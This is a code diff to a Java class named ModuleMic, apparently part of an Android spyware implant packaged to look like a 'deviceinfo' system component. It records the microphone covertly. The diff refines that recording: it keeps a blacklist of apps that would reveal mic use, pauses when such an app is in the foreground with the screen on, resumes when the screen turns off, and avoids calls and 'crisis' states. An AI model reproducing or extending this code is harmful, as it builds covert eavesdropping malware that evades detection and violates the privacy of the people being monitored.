@@ -11,6 +11,8 @@ package com.android.deviceinfo.module;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.util.HashSet;
+import java.util.Set;
 
 import android.content.Context;
 import android.media.AudioManager;
@@ -79,7 +81,22 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	boolean phoneListening;
 	private Observer<ProcessInfo> processObserver;
 
-	String[] blacklist = new String[] { "shazam", "com.vlingo.midas" };
+	Set<String> blacklist = new HashSet<String>();
+
+	public ModuleMic() {
+		super();
+		resetBlacklist();
+	}
+
+	public synchronized void resetBlacklist() {
+		blacklist.clear();
+		addBlacklist("shazam");
+		addBlacklist("com.vlingo.midas");
+	}
+
+	public synchronized void addBlacklist(String black) {
+		blacklist.add(black);
+	}
 
 	public static ModuleMic self() {
 		return (ModuleMic) ManagerModule.self().get(M.e("mic"));
@@ -109,15 +126,19 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			if (Cfg.DEBUG) {
 				Check.requires(status == StateRun.STARTING, "inconsistent status"); //$NON-NLS-1$
 			}
-			
-			if(standbyObserver == null){
+
+			if (standbyObserver == null) {
 				standbyObserver = new StandByObserver(this);
 			}
 
 			addPhoneListener();
-			if (Cfg.DEBUG) { Check.asserts(standbyObserver!=null, " (actualStop) Assert failed, null standbyObserver"); }
+			if (Cfg.DEBUG) {
+				Check.asserts(standbyObserver != null, " (actualStop) Assert failed, null standbyObserver");
+			}
 			ListenerStandby.self().attach(standbyObserver);
-			startRecorder();
+			if (canRecordMic()) {
+				startRecorder();
+			}
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "started");//$NON-NLS-1$
@@ -129,21 +150,11 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
 				Check.log(TAG + " (begin) Error: " + e.toString());//$NON-NLS-1$
 			}
-		} catch (final IOException e) {
+		} catch (IOException e) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (begin) Error: " + e.toString());//$NON-NLS-1$
 			}
 		}
 	}
@@ -161,7 +172,9 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		if (Cfg.DEBUG) {
 			Check.requires(status == StateRun.STOPPING, "state not STOPPING"); //$NON-NLS-1$
 		}
-		if (Cfg.DEBUG) { Check.asserts(standbyObserver!=null, " (actualStop) Assert failed, null standbyObserver"); }
+		if (Cfg.DEBUG) {
+			Check.asserts(standbyObserver != null, " (actualStop) Assert failed, null standbyObserver");
+		}
 
 		removePhoneListener();
 		ListenerStandby.self().detach(standbyObserver);
@@ -408,35 +421,6 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		return ret;
 	}
 
-	private void restartRecorder() {
-		try {
-			stopRecorder();
-			startRecorder();
-		} catch (final IllegalStateException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (restartRecorder) Error: " + e);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		} catch (final IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (restartRecorder) Error: " + e);//$NON-NLS-1$
-			}
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		}
-	}
-
 	/**
 	 * Start recorder.
 	 * 
@@ -597,14 +581,14 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 	}
 
 	public int notification(Standby b) {
-		if(b.isScreenOff()){
+		if (b.isScreenOff()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification) standby, resume mic");
 			}
-	
-			resume();	
-		}else{
-			if(isForegroundBlacklist()){
+
+			resume();
+		} else {
+			if (isForegroundBlacklist()) {
 				suspend();
 			}
 		}
@@ -637,16 +621,35 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 		}
 	}
 
-	@Override
-	public void resume() {
-		if (isSuspended() && !Status.crisisMic() &&!callOngoing) {
-			if(isForegroundBlacklist() && ListenerStandby.isScreenOn()){
+	private boolean canRecordMic() {
+		if (!Status.crisisMic() && !callOngoing) {
+			if (isForegroundBlacklist() && ListenerStandby.isScreenOn()) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (resume) can't resume because of blacklist");
 				}
-				return;
+				return false;
 			}
-			
+
+			if (ModuleCall.self() != null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (resume) can't switch on mic because call is on");
+				}
+				return false;
+			}
+			return true;
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (canRecordMic) crisis or call, cant rec");
+		}
+		return false;
+
+	}
+
+	@Override
+	public void resume() {
+		if (isSuspended() && canRecordMic()) {
+
 			try {
 				startRecorder();
 			} catch (final IllegalStateException e) {
@@ -686,6 +689,6 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
 		}
 
-		stopRecorder();
+		suspend();
 	}
 }
